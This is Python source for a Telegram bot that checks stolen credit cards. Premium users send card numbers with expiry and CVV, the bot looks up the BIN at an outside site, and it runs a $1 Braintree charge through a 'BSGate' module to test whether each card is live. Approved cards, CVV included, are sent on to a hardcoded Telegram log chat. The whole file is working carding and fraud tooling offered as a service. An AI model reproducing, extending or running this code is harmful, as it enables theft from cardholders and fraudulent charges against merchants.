import re
import time
import aiohttp
import asyncio
import logging
from cachetools import TTLCache
from pyrogram import Client, filters
from pyrogram.types import Message
import pyrogram.errors
from pages.braintreebs import BSGate
from procesos.mongo_data import MongoClient

# Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Configuración de caché en memoria para tarjetas duplicadas
cc_check_cache = TTLCache(maxsize=1000, ttl=300)

# Singleton para MongoClient
_mongo_client = None

async def get_mongo_client():
    """Obtiene una instancia singleton de MongoClient."""
    global _mongo_client
    if _mongo_client is None:
        _mongo_client = MongoClient()
    return _mongo_client

# Funciones de procesos.funciones
def addCommand(command):
    """Decorador para comandos de Pyrogram."""
    def decorator(func):
        async def wrapper(client, message):
            await func(client, message)
        prefixes = ['.', '/', ',', '¡', '-', '_', '|', '"', "'", '#', '$', '%', '&', '(', ')', '*', '+', '[', ']', ';', '<', '>', '?', '=', '¿', ':']
        return Client.on_message(filters.command(command, prefixes=prefixes))(wrapper)
    return decorator

async def antispam(antispam_value, message: Message):
    """Función genérica de antispam (basada en tiempo)."""
    current_time = time.time()
    last_command_time = antispam_value or 0
    if current_time - last_command_time < 10:
        await message.reply("⏳ **Demasiado rápido. Espera unos segundos.**", disable_web_page_preview=True)
        return True
    return False

def validate_ccs(cc_input):
    """Valida el formato de la tarjeta y devuelve componentes."""
    pattern = r'(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, cc_input)
    if match:
        return [match.group(1), match.group(2), match.group(3), match.group(4)]
    return "Invalid card format"

async def find_cards(text):
    """Extrae información de la tarjeta de un texto de forma asíncrona."""
    try:
        card_info = re.search(r'(\d{15,16})+?[^0-9]+?(\d{1,2})[\D]*?(\d{2,4})[^0-9]+?(\d{3,4})', text)
        if not card_info:
            return '<b>ingrese la ccs.</b>'
        cc, mes, ano, cvv = card_info.groups()
        cc = cc.replace("-", "").replace(" ", "")
        return cc, mes, ano, cvv
    except Exception as e:
        logger.error(f"Error extrayendo tarjeta: {e}")
        return '<b>ingrese la ccs.</b>'

async def get_bin_info(bin_number):
    """Obtiene información del BIN de forma asíncrona."""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f'https://chellyx.shop/dados/binsearch.php?bin={bin_number}', timeout=10) as response:
                response.raise_for_status()
                text_content = await response.text()
                parts = text_content.strip().split()
                if len(parts) >= 5:
                    bin_data = {
                        'brand': parts[0],
                        'bank': ' '.join(parts[1:-3]),
                        'level': parts[-3],
                        'country': parts[-2],
                        'type': parts[-1],
                        'country_name': parts[-2],
                        'country_flag': '🇲🇽' if parts[-2] == 'MEXICO' else '🏳️'
                    }
                else:
                    bin_data = {
                        'brand': 'No disponible',
                        'bank': 'No disponible',
                        'level': 'No disponible',
                        'country': 'No disponible',
                        'type': 'No disponible',
                        'country_name': 'No disponible',
                        'country_flag': '🏳️'
                    }
                return bin_data
        except aiohttp.ClientError as e:
            logger.error(f"Error en búsqueda de BIN {bin_number}: {e}")
            return {'bank': 'No disponible', 'brand': 'No disponible', 'type': 'No disponible', 'country': 'No disponible', 'country_name': 'No disponible', 'country_flag': '🏳️', 'level': 'No disponible'}
        except Exception as e:
            logger.error(f"Error parseando texto para BIN {bin_number}: {e}")
            return {'bank': 'No disponible', 'brand': 'No disponible', 'type': 'No disponible', 'country': 'No disponible', 'country_name': 'No disponible', 'country_flag': '🏳️', 'level': 'No disponible'}

async def check_duplicate_cc(user_id: int, cc_com: str) -> bool:
    """Verifica si la tarjeta ya fue procesada recientemente."""
    key = f"{user_id}:{cc_com}"
    if key in cc_check_cache:
        logger.info(f"CC duplicada detectada para user:{user_id}, cc:{cc_com}")
        return True
    cc_check_cache[key] = True
    return False

@addCommand('bs')
async def bs_command(client, message: Message):
    """Comando bs para verificar tarjetas con Braintree (1 USD)."""
    mongo = await get_mongo_client()
    queryU = await mongo.user_query(message.from_user.id)
    
    if queryU is None:
        return await message.reply(registre_text, disable_web_page_preview=True)
    
    if queryU.get('rango') == 'Baneado':
        return await message.reply(ban_text, disable_web_page_preview=True)
    
    if queryU.get('plan') != 'Premium':
        return await message.reply("<b>❗️ Este comando es solo para usuarios Premium.</b>", disable_web_page_preview=True)

    data = message.text.split(" ", 2)
    cc_input = None

    if message.reply_to_message:
        ccs = await find_cards(message.reply_to_message.text)
        if isinstance(ccs, tuple):
            cc, mes, ano, cvv = ccs
            cc_input = f"{cc}|{mes}|{ano}|{cvv}"
        else:
            return await message.reply(ccs, disable_web_page_preview=True)

    if not cc_input and len(data) >= 2:
        ccs = await find_cards(data[1])
        if isinstance(ccs, tuple):
            cc, mes, ano, cvv = ccs
            cc_input = f"{cc}|{mes}|{ano}|{cvv}"
        else:
            cc_input = data[1].strip()

    if not cc_input or len(cc_input) < 6:
        if message.reply_to_message:
            return await message.reply("<b>[❗️] No seas wey <code>Ingresa una tarjeta válida</code></b>", disable_web_page_preview=True)
        else:
            return await message.reply(f"""
<b>Braintree CCN Check</b>
command -> /bs
""", disable_web_page_preview=True)

    card = validate_ccs(cc_input)
    if not isinstance(card, list):
        return await message.reply(card, disable_web_page_preview=True)
    bins = card[0]

    if await antispam(queryU.get('antispam'), message):
        return

    if await check_duplicate_cc(message.from_user.id, cc_input):
        return await message.reply("⚠️ Esta tarjeta ya fue procesada recientemente. Intenta con otra.", disable_web_page_preview=True)

    bin_info = await get_bin_info(bins)

    ini = time.time()
    texto_1 = await message.reply(f'''
Procesando...🔎
''', disable_web_page_preview=True)

    status = "Declined! ❌"
    response = "Declined card"
    try:
        gate = BSGate()
        chk = await gate.main(cc_input)
        if isinstance(chk, tuple) and len(chk) >= 2:
            if "Approved" in chk[0]:
                status = "Approved! ✅"
                response = 'Charged $1'
            else:
                status = "Declined! ❌"
                response = chk[1]
    except Exception as e:
        logger.error(f"Error en BSGate para user:{message.from_user.id}: {e}")
        return await message.reply(f"Error procesando la tarjeta: {e}", disable_web_page_preview=True)

    fin = time.time()

    new_text = f"""
<b>Braintree CCN Check</b>
├ <b>Card:</b> <code>{cc_input}</code>
├ <b>Status:</b> {status}
├ <b>Response:</b> {response}
├ <b>Bank:</b> <code>{bin_info.get('bank', 'N/A')}</code>
├ <b>Type:</b> <code>{bin_info.get('brand', 'N/A')} {bin_info.get('level', 'N/A')} {bin_info.get('type', 'N/A')}</code>
├ <b>Country:</b> <code>{bin_info.get('country_flag', '🏳️')}{bin_info.get('country', 'N/A')}</code>
├ <b>Time:</b> <code>{fin-ini:0.2f}s</code>
└ <b>By:</b> <a href='https://t.me/DashSab'>@{message.from_user.username or message.from_user.id}</a> <code>[{queryU.get('rango', 'Unknown')}]</code>
"""
    
    try:
        await texto_1.edit_text(new_text, disable_web_page_preview=True)
        if status.lower() == "Approved! ✅":
            try:
                await client.send_message(
                    chat_id=7389519750,
                    text=new_text,
                    disable_web_page_preview=True
                )
            except pyrogram.errors.exceptions.bad_request_400.PeerIdInvalid:
                logger.error(f"Error: No se pudo enviar el mensaje al ID de log 7389519750. Verifica que el bot tenga acceso al chat.")
            except Exception as e:
                logger.error(f"Error al enviar al log: {e}")
    except pyrogram.errors.MessageNotModified:
        pass
    except Exception as e:
        logger.error(f"Error editando mensaje para user:{message.from_user.id}: {e}")
        await message.reply(new_text, disable_web_page_preview=True)